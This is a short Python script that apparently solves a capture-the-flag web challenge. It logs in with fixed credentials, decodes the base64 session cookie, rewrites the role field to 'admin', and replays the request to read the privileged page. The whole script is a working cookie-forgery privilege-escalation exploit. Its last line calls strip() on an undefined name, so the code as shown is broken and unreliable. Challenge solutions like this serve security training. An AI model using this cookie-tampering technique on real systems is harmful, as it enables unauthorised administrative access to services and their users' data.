from requests import * 
from urllib.parse import unquote
from base64 import b64decode, b64encode
from bs4 import BeautifulSoup

URL = "http://cma.challs.olicyber.it/"
PHP = "index.php"


s = Session()
payload = {"username": "Marchet91", "password":"marcianoaroma", "login": "Log+In"}

s.post(URL + PHP, data=payload).text

cookie = b64decode(unquote(s.cookies['session'])).decode().split("-")
cookie[-1] = "admin"
cookie = b64encode(("-".join(cookie)).encode())
# print(cookie)

s.cookies.clear()
s.cookies.set('session', cookie.decode())

soup = BeautifulSoup(s.post(URL + PHP, data=payload).text, "html.parser")
print(soup.find_all("h1")[1].contents[0].strip(ls))
